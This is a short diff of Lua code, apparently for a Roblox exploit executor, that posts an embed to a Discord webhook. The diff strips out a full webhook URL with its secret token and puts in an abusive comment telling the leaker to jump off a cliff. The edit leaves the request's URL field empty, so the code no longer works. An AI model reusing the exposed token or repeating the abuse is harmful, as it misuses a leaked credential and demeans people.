@@ -22,7 +22,7 @@ for i,v in pairs(response) do
 end
 
 syn.request({
-    Url = "https://discord.com/api/webhooks/1039964656950853663/wW0l5MynaSMgm75pl2G7C3MrpCaijnbaNkPJvnVT4aYO_iCOo-cq1ucx0yQuuL27H0St", 
+    Url = -- whoever leaked it pls jump off a cliff, 
     Body = game:GetService("HttpService"):JSONEncode({
         ["embeds"]={{
             ["title"]="Deaf",
